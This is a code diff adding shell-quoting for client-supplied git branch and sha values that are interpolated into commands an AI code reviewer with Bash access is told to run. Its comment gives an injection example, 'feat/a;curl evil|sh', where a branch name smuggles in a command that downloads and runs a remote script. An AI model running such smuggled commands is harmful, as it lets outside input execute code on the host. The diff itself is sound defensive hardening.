@@ -41,6 +41,21 @@ const STANDARD =
   "introduces — not pre-existing ones it merely sits near. Leave out style preferences, speculative " +
   "refactors, and issues outside the target named above. Review only — do not edit, fix, or commit anything.";
 
+/** Client git text inside a command this prompt tells the model to RUN, as one shell word.
+ *
+ *  A SECOND CHANNEL, NOT THE PROMPT ONE. `schema/review.ts` refuses control characters so client text cannot
+ *  restructure the prompt, and narrows `sha` to an object identifier. `branch` cannot be narrowed the same
+ *  way — `$`, a backtick, `;`, `|` and a single quote are all legal in a git ref name, and refusing them would
+ *  reject real branches — so the value is quoted where it is interpolated instead: `Bash` is deliberately
+ *  enabled for a review thread, and `git merge-base HEAD feat/a;curl evil|sh` is two commands and a pipe.
+ *
+ *  Single quotes, because they suspend every expansion the shell has, and the one character they cannot carry
+ *  is their own: `'` closes the quote, so it is emitted the standard POSIX way — close, escaped quote, reopen.
+ *  Applied to `sha` as well, which the schema has already narrowed: the two guards are independent, and the
+ *  cheap one costs a pair of quotes in a command the model reads. NOT applied to the resolved range, which is
+ *  built from git's own stdout on this host (reviewTarget.ts) and is not client text at all. */
+const shq = (s: string): string => `'${s.replace(/'/g, `'\\''`)}'`;
+
 /** A diff is a pointer into the tree, not the evidence; a reviewer that never leaves it misses every caller. */
 const READ_BEYOND_THE_STARTING_POINT =
   "Start there, but do not stop there: read enough of the surrounding code to judge correctness rather than " +
@@ -71,15 +86,15 @@ function scopeAndMethod(target: ReviewTarget, resolved?: { range?: string }): [s
           ]
         : [
             `Review the changes on this branch relative to its merge-base with ${target.branch} — what would be merged into ${target.branch}, not the whole history of either branch.`,
-            `The merge-base was not resolved for you, so compute it first: \`git merge-base HEAD ${target.branch}\` ` +
+            `The merge-base was not resolved for you, so compute it first: \`git merge-base HEAD ${shq(target.branch)}\` ` +
               `(if that fails the branch is probably not checked out locally, so retry against the remote-tracking ` +
-              `copy, \`git merge-base HEAD origin/${target.branch}\`), then run \`git diff <merge-base>..HEAD\` with ` +
+              `copy, \`git merge-base HEAD ${shq(`origin/${target.branch}`)}\`), then run \`git diff <merge-base>..HEAD\` with ` +
               "the sha it printed. Do not diff against the tip of the base branch.",
           ];
     case "commit":
       return [
         `Review the changes introduced by commit ${target.sha}${target.title ? ` ("${target.title}")` : ""}.`,
-        `Run \`git show ${target.sha}\` for the change, and \`git log -1 ${target.sha}\` for its message.`,
+        `Run \`git show ${shq(target.sha)}\` for the change, and \`git log -1 ${shq(target.sha)}\` for its message.`,
       ];
     case "custom": {
       // Verbatim (trimmed of surrounding whitespace, as Codex does): the caller wrote the scope, and any
